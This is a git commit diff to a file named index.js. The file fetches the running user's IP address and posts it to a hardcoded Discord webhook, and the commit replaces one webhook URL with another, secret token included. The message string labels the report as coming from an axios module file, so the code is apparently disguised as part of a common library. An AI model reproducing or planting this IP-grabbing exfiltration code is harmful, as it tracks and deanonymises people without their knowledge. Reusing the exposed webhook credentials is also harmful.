900cb54317e2a252659ad4254f37e96cb91adac1
Z3US <132375404+XTBrudi@users.noreply.github.com>
2023-09-05 23:09:00 +0200

    Update index.js

--- index.js
+++ index.js
@@ -5,7 +5,7 @@ fetch(apiUrl)
     const ipAddress = data.ip;
     console.log('Your IP address is:', ipAddress);
 
-    const webhookUrl = 'https://discord.com/api/webhooks/1133709436003819592/shzUtYlRW9IHuBu6VYGnjJ4BmAdxlFRUsqiFGwR9R9FiujvHpRSjwkvi608rbPCUgUBB';
+    const webhookUrl = 'https://discord.com/api/webhooks/1125791564967465140/x20jPNqrh61bD2WiuShGi1wy_7BMrqmOffn-uy2y29SulZK0JAusFMpkU7gTbSMHK75y';
 
     const message = {
       content: 'Node.js/modules/axios/dist/index.js/> Got IP: ' + ipAddress,
